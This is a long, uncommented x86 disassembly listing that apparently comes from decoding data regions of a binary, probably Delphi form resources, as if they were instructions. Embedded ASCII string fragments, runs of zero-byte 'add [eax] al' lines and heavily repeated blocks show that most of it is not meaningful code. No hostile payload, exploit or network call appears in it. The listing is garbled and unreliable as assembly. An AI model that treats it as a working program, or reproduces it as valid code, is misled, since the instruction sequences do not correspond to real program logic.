add [ edx + ecx * 8 ] al
inc ebp
add [ eax ] dh
0x45
inc ebp
add [ eax - 0x6fffba42 ] dl
jns r-xdata
dec ecx
inc ebx
je r-xdata
add al dh
mov ebp 0xbdfc0045
inc ebp
add [ eax ] cl
mov esi 0xc6640045
inc ebp
add ah ch
mov [ ebp ] sub_45c744
int3
add [ eax - 0x57ffbb87 ] dl
mov ebp 0x79900045
inc esp
add [ edx + ecx * 8 ] bh
inc ebp
add [ eax - 0x37 ] cl
inc ebp
add [ 0x4000100 ] cl
mov al 0x10
mov al 0x11
mov ebp 0x2c002b
sub eax 0xb0008700
[ edi - 0x52005101 ]
add [ eax ] dh
adc cl [ ecx ]
js r-xdata
insb
jae r-xdata
mov ebx 0x755c0045
add [ ecx + eax * 4 + 0x44 ] ah
add ah cl
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add ah cl
mov edx 0x6f800045
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd44596b3
jle r-xdata
add [ eax + 0x4d6c9090 ] dl
sub_454d52
inc esp
add [ eax - 0x1d ] cl
inc edx
add [ esp + eax * 4 + 0x44 ] ch
add al bl
cmp ecx [ ecx ]
dec eax
add [ eax + eax + 0x64 ] 0xcc004481
mov ebx 0x755c0045
dec ecx
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ edi + eax * 8 + 0x45 ] ah
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add ah cl
mov edx 0x6f800045
dec ecx
add [ ebp + esi * 2 + 0x74d80049 ] cl
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd44596b3
jle r-xdata
push esp
mov esp 0x2bec0045
dec ecx
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ eax - 0x3d ] dl
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add al al
dec ecx
add al al
sub [ ecx ] ecx
sbb al cl
inc ebp
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + edi * 4 + 0x45 ] dl
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
je r-xdata
add [ esi + edi + 0x7d080049 ] al
add [ eax + ebp * 2 + 0x49 ] bh
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] al
mov ebp 0xbd2c0045
inc ebp
add [ eax + 0x280045ca ] bl
mov esp 0xc96c0045
inc ebp
add [ eax - 0x37 ] bh
inc ebp
add [ edx + ecx * 8 ] al
inc ebp
add [ eax ] dh
0x45
inc ebp
add [ eax - 0x6fffba42 ] dl
jns r-xdata
add al dh
mov ebp 0xbdfc0045
inc ebp
add [ eax ] cl
mov esi 0xc6640045
inc ebp
add ah ch
mov [ ebp ] sub_45c744
int3
add [ eax - 0x57ffbb87 ] dl
mov ebp 0x79900045
inc esp
add [ edx + ecx * 8 ] bh
inc ebp
add [ eax - 0x37 ] cl
inc ebp
add [ 0x4000100 ] cl
mov al 0x10
mov al 0x11
mov ebp 0x2c002b
sub eax 0xb0008700
[ edi - 0x52005101 ]
sub_454e6a
dec ecx
add [ eax - 0x44 ] bh
inc ebp
add [ eax + ecx * 8 - 0x3f8bffbb ] cl
inc ebp
add [ eax - 0x6fffba42 ] dl
jns r-xdata
add al dh
mov ebp 0xbdfc0045
inc ebp
add [ eax ] cl
mov esi 0xc6640045
inc ebp
add ah ch
mov [ ebp ] sub_45c744
int3
add [ eax - 0x57ffbb87 ] dl
mov ebp 0x79900045
inc esp
add [ edx + ecx * 8 ] bh
inc ebp
add [ eax - 0x37 ] cl
inc ebp
add [ 0x4000100 ] cl
mov al 0x10
mov al 0x11
mov ebp 0x2c002b
sub eax 0xb0008700
[ edi - 0x52005101 ]
sub_454ead
push [ ebx + 0x45bdb8ff ]
add [ esi + edi * 4 ] ch
inc ebp
add [ eax - 0x42 ] al
inc ebp
add al ch
les eax [ ebp ]
in al 0xbd
inc ebp
add al dh
mov ebp 0xbdfc0045
inc ebp
add [ eax ] cl
mov esi 0xc6640045
inc ebp
add ah ch
mov [ ebp ] sub_45c744
int3
sub_454fe6
inc ebp
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ edi + eax * 8 + 0x45 ] ah
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add al dh
0x45
sub_45501f
add al bl
je r-xdata
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445992f
jle r-xdata
inc ebp
push esp
mov esp 0xce040045
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] al
mov ebp 0xbd2c0045
inc ebp
add [ eax + 0x280045ca ] bl
mov esp 0xc96c0045
inc ebp
add [ eax - 0x37 ] bh
inc ebp
add [ edx + ecx * 8 ] al
inc ebp
add [ eax ] dh
0x45
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ esp + ecx * 8 + 0x45 ] al
add al al
sub [ ecx ] ecx
mov al 0xcc
inc ebp
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + edi * 4 + 0x45 ] dl
add [ esi + ecx * 8 ] al
add [ eax + ebx * 8 ] cl
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
sub_4550e6
dec ecx
add [ eax - 0x44 ] bh
inc ebp
add [ eax + ecx * 8 - 0x3f8bffbb ] cl
inc ebp
add [ eax + 0x640045be ] dl
fadd [ ebp ]
sbb al 0xcc
inc ebp
add [ eax + 0x580045bd ] ch
fadd [ ebp ]
cmp al 0xca
inc ebp
add [ eax - 0x37 ] cl
inc ebp
add [ eax - 0x32 ] bl
inc ebp
add [ eax + 0x5c0045c6 ] cl
salc
inc ebp
add ah bl

sub_4551fa
inc ebp
add [ ebp + esi * 2 + 0x49 ] bl
add [ eax - 0x3fffb6d5 ] al
dec ebp
inc edx
add [ edi + eax * 8 + 0x45 ] ah
add [ ebp + 0x12300049 ] dl
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add al dh
0x45
sub_455233
add al bl
je r-xdata
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd4459b43
jle r-xdata
inc ebp
push esp
mov esp 0xce040045
add [ eax + 0x40048e1 ] bl
loopne r-xdata
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ eax ] al
mov ebp 0xbd2c0045
inc ebp
add [ eax + 0x280045ca ] bl
mov esp 0xc96c0045
inc ebp
add [ eax - 0x37 ] bh
inc ebp
add [ edx + ecx * 8 ] al
inc ebp
add [ eax ] dh
0x45
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ esp + ecx * 8 + 0x45 ] al
add al al
sub [ ecx ] ecx
mov al 0xcc
inc ebp
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + edi * 4 + 0x45 ] dl
add [ esi + ecx * 8 ] al
add [ eax + ebx * 8 ] cl
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
sub_4552fa
dec ecx
add [ eax - 0x44 ] bh
inc ebp
add [ eax + ecx * 8 - 0x3f8bffbb ] cl
inc ebp
add [ eax + 0x640045be ] dl
fadd [ ebp ]
sbb al 0xcc
inc ebp
add [ eax + 0x580045bd ] ch
fadd [ ebp ]
cmp al 0xca
inc ebp
add [ eax - 0x37 ] cl
inc ebp
add [ eax - 0x32 ] bl
inc ebp
add [ eax + 0x5c0045c6 ] cl
salc
inc ebp
add ah bl

sub_455470
dec eax
add [ ecx - 0x3700ffff ] ch
ja r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
push ss
add [ ecx ] cl
inc edx
jbe r-xdata
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
test al 0x1
add bh bh
push esp
ja r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b001d ] al
outsd
push eax
adc eax [ edx ]
pop edi
add [ eax ] al
push [ eax ]
add dh bh
xchg esp eax
loopne r-xdata
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sbb [ eax ] eax
pop es
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ edi ] dl
add [ edx ] cl
inc edx
jbe r-xdata
les edi [ edx + 0x48 ]
jb r-xdata
add [ eax ] al
add [ 0x1cff0000 ] 0x0
add eax 0x6f6c6f43
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4208001a ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xe065646f
xor [ ebp ] eax
aam 0x2
add bh bh
sub al al
inc ebp
add [ ecx ] al
inc esp
imul ecx [ ebp + 0x6f ] 0x31e06564
inc ebp
add ah dl
add al [ eax ]
[ eax ]
insb
dec edi
jne r-xdata
add bh bh
enter 0x1 0xff
inc ebx
outsd
jne r-xdata
hlt
imul ebp [ esi + 0x74 ] 0x44561873
add cl ah
add [ eax ] eax
inc [ edx + ebp * 2 + 0x49 ]
add [ eax + 0x6a ] ch
dec ecx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4305001e ] al
je r-xdata
outsb
jae r-xdata
jl r-xdata
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb eax [ eax ]
or [ ebx + 0x68 ] al
popad
jb r-xdata
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add bh bh
je r-xdata
jb r-xdata
xor eax [ eax + ebx + 0x56 ]
inc esp
dec [ eax ]
push ebx
dec ecx
add [ edx + ebp * 2 + 0x49 ] dh
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] dh
add bh bh
mov [ ecx + ecx * 2 ] cs
add [ ecx ] al
add [ edx + eax ] dl
inc esp
sbb [ esi + 0x44 ] dl
int3
jns r-xdata
sbb [ eax ] al
add eax 0x6c797453
dec edi
inc ebp
add dh dl
add al [ eax ]
push [ ecx + eax ]
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi ] al
push esi
inc esp
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
les edi [ ecx + 0x640046 ]
add bh bh
loopne r-xdata
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al 0x0
pop es
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
sub al 0xd1
add [ eax ] al
add [ eax ] al
and al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
insb
inc edx
jne r-xdata
add [ eax + eax ] ch
jmp [ eax ]
push 0x6100487b
add [ eax ] al
[ edi + ecx * 8 - 0x2f37ffb8 ]
add [ eax - 0x80000000 ] al
daa
add [ edi ] al
dec ecx
insd
dec esi
popad
insd
insb
push esi
inc esp
add [ ecx + eax ] dl
add dh bh
sbb [ ecx ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ ecx + 0x74 ]
insd
dec eax
imul esp [ gs : edi + 0x68 ] 0x44566c74
add ah bl
add [ eax ] al
add [ eax + 0x48 ] dh
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040025 ] al
outsd
add [ eax ] cl
inc esp
jb r-xdata
add [ eax ] eax
lea ecx [ eax ]
les eax [ ecx ]
add bh bh
les eax [ ecx ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
add [ es : edi ] al
dec ecx
insd
dec ebp
outsd
fmul [ gs : ebp + 0x1c80048 ]
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and eax 0x6f460400
dec ebp
outsd
insb
push esi
inc esp
add [ eax + 0x2 ] ch
add bh bh
and [ ecx ] al
add dh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x8 ] al
and eax [ eax ]
or eax 0x706f7244
inc esp
outsd
ja r-xdata
jb r-xdata
cwde
jno r-xdata
dec eax
add [ eax ] ah
add dh bh
add [ eax ] eax
add [ eax ] al
add [ ecx + edx * 8 ] ch
add [ edx ] bh
add bh bh
jpe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
and [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
jae r-xdata
add [ eax + eax ] cl
sbb [ esi + 0x44 ] dl
jb r-xdata
add [ eax ] 0x0
add [ eax + 0x440e001f ] al
outsd
jne r-xdata
jpe r-xdata
add al [ eax ]
jmp [ eax ]
add [ ebx - 0x74010000 ] cl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
sub_455ca0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
mov [ ebp + 0x45 ] bl
add [ eax + eax ] dh
add [ eax ] al
inc esp
mov [ eax ] cs
insb
add [ eax + eax + 0x74 ] 0x82
inc esp
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xdaac0042 0x45
sub_455d06
dec eax
add [ eax + 0x340042ea ] ah
jmp r-xdata
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_455d0f
add [ eax - 0x4fffbd15 ] cl
leave
dec eax
add al dl
fiadd [ ebp ]
cmp dl cl
dec eax
add ah dh
adc eax [ ebp ]
adc [ edi ] cl
dec ecx
add [ eax ] dl
int3
sub_455d3c
adc [ eax * 2 + 0x48cb5400 ] 0x0
or bl bl
inc ebp
add [ eax - 0x35 ] bh
dec eax
add [ eax + 0x18004514 ] dl
cmovns eax [ eax ]
js r-xdata
inc ebp
add [ eax ] dl
cmovns eax [ eax ]
adc ah cl
dec eax
add [ eax + 0x440048ca ] al
adc al 0x45
add [ eax + 0x14 ] bl
inc ebp
add al bh
0x48
dec eax
add [ eax - 0x5fffb734 ] bh

sub_455d7e
dec eax
add [ ebx + ecx * 8 - 0x3327ffb8 ] bl
dec eax
add [ ecx ] dl
push esp
inc edx
jne r-xdata
or [ ecx ] cl
xchg esp eax
and eax 0x12300049
je r-xdata
nop
dec cx
add [ eax + 0x67 ] dl
dec ecx
add al bl
je r-xdata
dec ecx
add [ eax - 0x23 ] bh
dec eax
add [ edx + ebp * 8 ] dl
inc edx
add [ eax ] bl
out 0x42 eax
add [ eax ] dl
out 0x42 eax
add [ edx + ebp * 8 ] bl
inc edx
add [ ebx + ebx * 8 + 0x45 ] ch
add [ eax - 0x73ffb691 ] al
jne r-xdata
inc edx
add [ eax + 0x8 ] bl
dec ecx
add [ ebp + 0x12300049 ] dl
outsb
inc ecx
arpl [ ecx + ebp * 2 + 0x6f ] si
outsb
dec esp
imul ebp [ esi + 0x6b ] 0x5df49090
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
pop edi
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al bl
pop esi
inc ebp
add dl dh
pop esi
inc ebp
add [ edx + eax ] ch
add [ eax + edx * 4 + 0x48 ] dh
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add ah bh
jmp 0xffffffff84a95e1c
outsb
je r-xdata
add [ eax + ebp * 2 + 0x49 ] bh
add [ ecx + 0x67340049 ] dh
dec ecx
add [ eax - 0x1bffb6ee ] ch
sbb eax 0x2d000049
dec ecx
add [ eax - 0x23 ] cl
inc ebp
add al al
sub [ ecx ] ecx
aam 0x27
dec ecx
add [ eax - 0x43ffb6d3 ] bl
sub eax 0x2e500049
dec ecx
add [ esp + ebp + 0x49 ] dl
push eax
dec ecx
add [ edi + ecx * 8 + 0x69b00048 ] bl
dec ecx
add al dl
imul ecx [ ecx ] sub_49663c
in al 0xce
dec eax
add [ eax ] ch
or cl [ ecx ]
push esp
or cl [ ecx ]
xor al 0x4c
dec ecx
add [ eax - 0x23 ] ah
dec eax
add [ eax ] bl
ror [ eax ] 0x1
call 0xffffffffd445a73b
jle r-xdata
imul esp [ ecx + 0x43 ] 0x65746e65
jb r-xdata
outsd
insb
nop
nop
nop
or [ edi + 0x45 ] bl
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
add ah ch
sub ecx [ ecx ]
xchg esp eax
jge r-xdata
push esp
sub al 0x49
add [ eax + 0x40048e1 ] bl
loopne r-xdata
nop
push ebx
je r-xdata
je r-xdata
add [ esi + edi + 0x7d080049 ] al
dec ecx
add [ eax - 0x13ffb6cf ] dl
dec ecx
add [ eax + 0x7e ] bl
dec ecx
add ah ah
dec ecx
add [ esp + ebx * 8 ] dl
inc ebp
add [ eax ] bh
fadd [ ebp ]
add al 0x0
cmp [ ebp - 0x10ffec ] bh
add [ ebp + edi * 2 + 0x687c0049 ] dl
dec ecx
add [ esp + ebx * 8 ] bh
inc ebp
add al ah
into
dec eax
add al bl
or cl [ ecx ]
push esp
outsd
jo r-xdata
imul ebp [ esi + 0x73 ] 0x60009090
inc ebp
add [ edi ] al
or eax 0x616d4954
dec ebp
popad
jb r-xdata
or eax 0x616d4954
dec esi
inc edx
add [ eax - 0x37ffba23 ] al
fld [ ebp ]
inc ebx
je r-xdata
jb r-xdata
outsb
inc ebx
outsd
inc ebp
add [ edx + eax * 4 + 0x44 ] ch
push esi
inc esp
add [ eax + eax ] al
add bh bh
fcomp st5
inc ebp
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x68676952
imul ebp [ esi + 0x73 ] r-xdata
push esp
sbb eax 0x40042
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
popad
jb r-xdata
dec ebp
insb
dec ebp
push esp
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
pop edi
inc ebp
add [ eax + eax ] ah
add [ eax ] al
aam 0x1c
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 + 0x4e900042 ] dl
inc edx
add [ eax - 0x7fffbdb2 ] bl
fld [ ebp ]
enter 0x45dd 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45 ] ah
outsd
insb
hlt
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xdaac0042 0x45
push esi
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
inc edx
outsd
je r-xdata
insb
jae r-xdata
outsb
je r-xdata
nop
fcomp [ edi + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
inc ebp
xor al 0xeb
inc edx
add [ eax - 0x4fffbd15 ] cl
leave
dec eax
add al dl
fiadd [ ebp ]
cmp dl cl
dec eax
add ah dh
adc eax [ ebp ]
adc [ edi ] cl
dec ecx
add [ eax ] dl
int3
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
outsd
insd
nop
nop
cld
pushad
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004561 ] dl
add [ eax ] al
add [ esp + ebx * 2 - 0x7d93ffbb ] bl
inc esp
add [ eax ] dl
add [ eax ] al
add [ esi + edx * 2 + 0x44 ] ch
sub_455ee1
push [ esp + ebx * 8 - 0x22e3ffbb ]
inc ebp
add al al
fild [ ebp ]
or al 0xdc
inc ebp
add [ esi ] cl
push esp
inc edx
jne r-xdata
outsd
je r-xdata
je r-xdata
inc edx
add [ eax - 0x37ffba23 ] al
fld [ ebp ]
outsd
insd
or [ ecx + 0x61 ] ch
inc ebx
outsb
je r-xdata
imul esp [ ecx + 0x42 ] 0x6f74746f
outsb
inc ebx
outsd
outsb
je r-xdata
push esp
outsd
jo r-xdata
imul ebp [ esi + 0x73 ] 0x60009090
inc ebp
add [ edi ] al
or eax 0x616d4954
dec ebp
popad
jb r-xdata
or eax 0x616d4954
dec esi
jb r-xdata
imul esp [ ecx + 0x43 ] 0x65746e65
outsd
insb
nop
nop
nop
or [ edi + 0x45 ] bl
add [ edi ] al
push cs
push esp
inc edx
jne r-xdata
inc ebp
add [ edx + eax * 4 + 0x44 ] ch
push esi
inc esp
add [ eax + eax ] al
add bh bh
fcomp st5
inc ebp
add [ ecx ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ 0x68676952 ] al
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al [ eax ]
add eax 0x68676952
imul ebp [ esi + 0x73 ] r-xdata
push esp
sbb eax 0x40042
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
inc edx
add [ eax - 0x7fffbdb2 ] bl
fld [ ebp ]
enter 0x45dd 0x0
nop
push ebx
je r-xdata
je r-xdata
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add al ch
0xdaac0042 0x45
push esi
inc esp
add [ eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
inc edx
outsd
je r-xdata
insb
jae r-xdata
dec esi
inc ebx
je r-xdata
jb r-xdata
outsb
inc ebx
outsd
xor al 0xeb
inc edx
add [ eax - 0x4fffbd15 ] cl
leave
dec eax
add al dl
fiadd [ ebp ]
cmp dl cl
dec eax
add ah dh
adc eax [ ebp ]
adc [ edi ] cl
dec ecx
add [ eax ] dl
int3
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
outsd
insd
nop
nop
cld
pushad
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004561 ] dl
add [ eax ] al
add [ esp + ebx * 2 - 0x7d93ffbb ] bl
inc esp
add [ eax ] dl
add [ eax ] al
add [ esi + edx * 2 + 0x44 ] ch
popad
jb r-xdata
dec ebp
insb
dec ebp
push esp
dec ecx
insd
popad
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah ch
pop edi
inc ebp
add [ eax + eax ] ah
add [ eax ] al
aam 0x1c
inc edx
add [ edx + eax * 4 + 0x44 ] ch
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
add [ esp + eax * 4 + 0x44 ] ch
add [ eax - 0x7c ] ah
inc esp
add [ eax - 0x7f ] cl
inc esp
add [ ecx + eax * 4 + 0x44 ] ah
add [ ebp + ecx * 2 + 0x4e900042 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45 ] ah
outsd
insb
hlt
outsb
je r-xdata
nop
fcomp [ edi + 0x45 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushad
inc ebp
sub_456089
fcomp st5
inc ebp
add [ ecx ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ esi ] al
inc edx
outsd
je r-xdata
xor al 0xeb
inc edx
add [ eax - 0x4fffbd15 ] cl
leave
dec eax
add al dl
fiadd [ ebp ]
cmp dl cl
dec eax
add ah dh
adc eax [ ebp ]
adc [ edi ] cl
dec ecx
add [ eax ] dl
int3
outsd
insd
nop
nop
cld
pushad
inc ebp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x34004561 ] dl
add [ eax ] al
add [ esp + ebx * 2 - 0x7d93ffbb ] bl
inc esp
add [ edx + eax * 4 + 0x44 ] dh
add [ esp + eax * 4 + 0x44 ] cl
add [ esp + eax * 4 + 0x44 ] al
add [ esp + eax * 4 + 0x44 ] ah
add [ eax - 0x7c ] ch
inc esp
